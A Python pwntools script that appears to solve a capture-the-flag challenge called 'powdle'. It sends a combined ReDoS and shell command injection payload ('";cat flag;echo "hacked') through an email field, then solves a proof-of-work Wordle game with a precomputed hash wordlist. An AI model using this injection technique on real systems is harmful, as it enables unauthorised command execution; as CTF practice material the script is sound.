from pwn import *
import string
import random
import hashlib
import itertools
import time
from multiprocessing import Pool
import sys

DIFF=5

def pow(s, difficulty=DIFF):
    m = hashlib.sha256()
    m.update(s)
    h = m.hexdigest()[:difficulty]
    return h.encode()

context.log_level = 'debug'
if len(sys.argv) > 2:
    s = remote(sys.argv[1], sys.argv[2])
else:
    s = remote('powdle.sstf.site', 9999)

s.recvuntil(b'email: ')
# ReDos + Command injection
if 'test' in sys.argv:
    s.sendline(b'test@test.com')
else:
    redos = '.@'*2000
    cmd = 'cat flag'
    s.sendline('{}";{};echo "hacked '.format(redos, cmd).encode())


#Solving Proof-of-Workdle
for round in range(5):
    s.recvuntil(b'Challenge: ')
    challenge = s.recvuntil(b'\n').strip()
    t = time.time()
    print("#{} Challenge: {}".format(round+1, challenge))

    #Making wordlist of 4 millions
    #4M would be enough for 2**20 ~= 1M PoW hash
    wordlist = [ (pow(challenge+str(i).encode()), str(i).encode()) for i in range(3000000)]
    print('{}'.format(time.time()-t))
    wrong = []
    fixed = [False]*DIFF

    for trial in range(10):
        print("Trial {}: {}".format(trial+1, len(wordlist)))
        s.recvuntil(b': ') #guess
        max_c = 0
        for w in wordlist[:100]:
            w_c = len(set(w[0]))
            if w_c > max_c:
                max_c = w_c
                guess = w
        s.sendline(challenge+guess[1])
        for _ in range(trial):
            print(s.recvuntil(b'\n').decode())
        board = []
        for i in range(DIFF):
            r = s.recvuntil(b' \033[0m')
            board.append(r)
        print(''.join([r.decode() for r in board]))

        #Greedy wordle solving
        for i,r in enumerate(board):
            c = r[-6]
            if b'42m' in r: # green
                wordlist = [ x for x in wordlist if x[0][i] == c]
                fixed[i] = True
                print("{} correct".format(chr(c)))
        for i,r in enumerate(board):
            c = r[-6]
            if b'43m' in r:
                wordlist = [ x for x in wordlist if x[0][i] != c and any( c==b for bi, b in enumerate(x[0]) if not fixed[bi] and bi!=i ) ]
                print("{} miss".format(chr(c)))
            elif b'100m' in r:
                if c in wrong:
                    # already processed
                    continue
                wordlist = [ x for x in wordlist if all([ c!=b for bi, b in enumerate(x[0]) if not fixed[bi] ]) ]
                wrong.append(c)
                print("{} wrong".format(chr(c)))
        res = s.recvuntil(b'!\n')
        if b'Correct' in res:
            break
        elif b'Try' in res:
            continue

s.interactive()

